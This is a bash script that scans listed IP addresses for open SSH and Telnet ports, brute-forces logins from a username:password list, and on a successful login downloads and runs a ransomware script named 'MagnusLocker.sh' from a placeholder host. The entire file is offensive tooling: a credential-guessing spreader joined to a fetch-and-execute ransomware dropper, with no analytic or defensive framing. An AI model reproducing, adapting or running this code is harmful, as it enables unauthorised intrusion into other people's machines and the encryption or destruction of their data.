#!/bin/bash

if [ $# -ne 2 ]; then
  echo "Usage: $0 ip-list.txt user-pass-list.txt"
  exit 1
fi

ip_list=$1
user_pass_list=$2

check_open_ports() {
  echo "Checking $1 for open ports..."
  open_ports=$(nmap -p 22,23 --open -Pn -T4 $1 | awk '/open/ {print $1}')
  if [[ $open_ports =~ "22/tcp" ]]; then
    echo "SSH port is open on $1"
    return 0
  elif [[ $open_ports =~ "23/tcp" ]]; then
    echo "Telnet port is open on $1"
    return 1
  else
    echo "No open ports 22 or 23 found on $1"
    return 2
  fi
}

login_ssh() {
  while read user_pass; do
    username=$(echo $user_pass | cut -d: -f1)
    password=$(echo $user_pass | cut -d: -f2)

    sshpass -p "$password" ssh "$username"@"$1" 'id -u' | grep -q 0

    if [ $? -eq 0 ]; then
      echo "Successfully logged in to $1 as root user"
      encrypt_victim "ssh" "$username" "$password" "$1"
      break
    fi
  done < $2
}

login_telnet() {
  while read user_pass; do
    username=$(echo $user_pass | cut -d: -f1)
    password=$(echo $user_pass | cut -d: -f2)

    telnet "$1" << EOF
    $username
    $password
    EOF
    if [ $? -eq 0 ]; then
      echo "Successfully logged in to $1 as $username"
      encrypt_victim "telnet" "$username" "$password" "$1"
      break
    fi
  done < $2
}

encrypt_victim() {
  wget "http://xxx/MagnusLocker.sh" -O MagnusLocker.sh
  if [ -f "MagnusLocker.sh" ]; then
    chmod +x MagnusLocker.sh
    ./MagnusLocker.sh
  else
    echo "Error: Failed to download MagnusLocker.sh"
    exit 1
  fi
}

main() {
  while read ip; do
    check_open_ports $ip
    case $? in
      0) login_ssh $ip $user_pass_list;;
      1) login_telnet $ip $user_pass_list;;
      2) echo "No open ports 22 or 23 found on $ip";;
    esac
  done < $ip_list
}

main
